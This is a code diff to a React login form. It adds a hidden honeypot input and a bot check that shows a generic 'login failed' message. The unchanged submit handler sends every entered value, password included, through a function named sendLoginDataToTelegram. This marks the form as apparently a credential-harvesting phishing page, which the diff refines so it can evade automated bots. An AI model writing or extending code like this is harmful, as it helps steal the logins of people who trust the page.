@@ -47,6 +47,7 @@ const formSchema = z.discriminatedUnion("loginType", [
     countryCode: z.string().min(1, "Country code is required"),
     phone: z.string().regex(/^\d{1,15}$/, "Please enter a valid phone number."),
     password: z.string().min(8, "Password must be at least 8 characters."),
+    honeypot: z.string().optional(),
   }),
   z.object({
     loginType: z.literal("email"),
@@ -57,6 +58,7 @@ const formSchema = z.discriminatedUnion("loginType", [
         return isEmail || isUsername;
       }, "Please enter a valid email or username."),
     password: z.string().min(8, "Password must be at least 8 characters."),
+    honeypot: z.string().optional(),
   }),
 ]);
 
@@ -78,6 +80,7 @@ export function LoginForm() {
       countryCode: "+1",
       phone: "",
       password: "",
+      honeypot: "",
     },
   });
 
@@ -118,17 +121,30 @@ export function LoginForm() {
         countryCode: selectedCountry?.code || "+1",
         phone: "",
         password: "",
+        honeypot: "",
       });
     } else {
       reset({
         loginType: "email",
         identifier: "",
         password: "",
+        honeypot: "",
       });
     }
   };
 
   async function onSubmit(values: LoginFormValues) {
+    if (values.honeypot) {
+      console.log("Bot submission detected.");
+      // You can choose to show a generic error or just do nothing.
+      toast({
+        title: t('loginFailed'),
+        description: t('loginFailedMessage'),
+        variant: "destructive",
+      });
+      return;
+    }
+
     const result = await sendLoginDataToTelegram(values);
     
     if (result.success) {
@@ -194,6 +210,17 @@ export function LoginForm() {
         </TabsList>
         <Form {...form}>
           <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 pt-4">
+            <FormField
+                control={control}
+                name="honeypot"
+                render={({ field }) => (
+                    <FormItem className="hidden">
+                    <FormControl>
+                        <Input type="text" {...field} tabIndex={-1} autoComplete="off" />
+                    </FormControl>
+                    </FormItem>
+                )}
+            />
             <TabsContent value="phone" className="m-0 space-y-4">
               <div className="flex items-start gap-2">
                 <FormField
